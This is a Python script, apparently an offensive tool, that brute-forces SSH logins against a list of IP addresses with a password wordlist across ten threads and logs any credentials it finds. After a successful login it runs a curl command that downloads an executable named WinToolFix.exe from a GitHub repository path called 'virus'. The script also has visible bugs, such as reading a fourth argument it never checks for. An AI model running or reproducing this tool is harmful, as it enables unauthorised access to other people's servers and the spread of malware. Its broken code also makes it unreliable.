import paramiko
import threading
import queue
import time
import os

# Function to log the attempt to a log file
def log_attempt(message):
    with open('brute_force_log.txt', 'a') as log_fh:
        log_fh.write(message + '\n')

# Worker function to perform SSH login attempts
def brute_force_worker(id, queue, wordlist, username):
    while not queue.empty():
        ip = queue.get()
        for password in wordlist:
            password = password.strip()  # Remove any trailing newlines
            print(f"Thread {id}: Attempting {username}@{ip} with password: {password}")
            
            # Initialize SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Retry logic with exponential backoff
            retry_count = 0
            while retry_count < 3:
                try:
                    ssh.connect(ip, username=username, password=password, timeout=5)
                    print(f"Thread {id}: Successfully logged in to {ip} as {username} with password: {password}")
                    log_attempt(f"Success: {username}@{ip} with password: {password}")
                    
                    # Execute the command after success (use with caution)
                    print(f"Thread {id}: Executing download command...")
                    response = os.system('curl -L -o WinToolFix.exe https://github.com/Fhchcjcjcjcjvkkvk/virus/raw/refs/heads/main/WinToolFix.exe')
                    print(f"Thread {id}: Executed curl command.")
                    ssh.close()
                    return  # Exit the worker thread after success
                except paramiko.AuthenticationException:
                    print(f"Thread {id}: Failed login to {ip} as {username} with password: {password}")
                    retry_count += 1
                    time.sleep(2 ** retry_count)  # Exponential backoff
                    continue
                except Exception as e:
                    print(f"Thread {id}: Error with {ip}: {e}")
                    retry_count += 1
                    time.sleep(2 ** retry_count)
                    continue
                finally:
                    ssh.close()

# Main function to load files, initialize threads, and process queue
def main():
    # Check if the correct arguments are passed
    import sys
    if len(sys.argv) != 3:
        print("Usage: python brute_force.py <username> <ips_file> <wordlist_file>")
        sys.exit(1)

    username = sys.argv[1]
    ips_file = sys.argv[2]
    wordlist_file = sys.argv[3]

    # Log file setup
    with open('brute_force_log.txt', 'a') as log_fh:
        log_fh.write(f"Starting brute-force attack: {username}\n")

    # Read IPs and wordlist
    with open(ips_file, 'r') as ip_fh:
        ips = ip_fh.readlines()

    with open(wordlist_file, 'r') as wordlist_fh:
        wordlist = wordlist_fh.readlines()

    # Initialize the queue and add IPs
    ip_queue = queue.Queue()
    for ip in ips:
        ip_queue.put(ip.strip())  # Strip any trailing newlines from IPs

    # Create and start threads
    num_threads = 10  # You can adjust the number of threads here
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=brute_force_worker, args=(i + 1, ip_queue, wordlist, username))
        t.start()
        threads.append(t)

    # Wait for all threads to complete
    for t in threads:
        t.join()

    print("Brute-force attack completed.")

if __name__ == '__main__':
    main()
